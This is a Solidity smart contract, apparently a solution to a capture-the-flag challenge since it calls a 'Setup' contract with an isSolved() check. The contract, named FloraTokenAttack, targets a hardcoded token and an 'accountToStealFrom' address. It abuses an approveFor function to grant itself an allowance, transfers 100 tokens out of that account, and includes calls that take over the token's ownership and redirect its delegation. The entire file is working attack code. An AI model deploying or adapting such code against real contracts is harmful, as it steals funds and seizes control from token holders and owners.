/**
 *Submitted for verification at Etherscan.io on 2022-04-02
*/

//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.9;

// Flora Token functions to use  
interface IFloraToken {
    function delegate(address delegatee) external;
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external; 
}
// Setup function to use  
interface ISetup {
    function isSolved() external view returns (bool);
    function approveFor(address TokenHolder, address spender, uint256 amount) external returns(bool);
}

contract FloraTokenAttack {
    
    address public constant FloraToken = 0x75b665c3695293659949c18719d046089F423834;
    address public constant SetupFlora = 0xd80960575d177A09FEb8497dBaE9F6583fcFe297;
    address public constant accountToStealFrom = 0x9678408E1B126A985D61a0A6c99ae98AbF4c85B3;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function getTokens() external  {
        ISetup(SetupFlora).approveFor(accountToStealFrom, address(this), 100);

    }

    function stealFunds() external {
        IFloraToken(FloraToken).transferFrom(accountToStealFrom, address(this), 100);
    }

    function delegate(address delegatee) external {
        IFloraToken(FloraToken).delegate(delegatee);
    }

    function transferOwner() external {
        IFloraToken(FloraToken).transferOwnership(address(this));
    }


}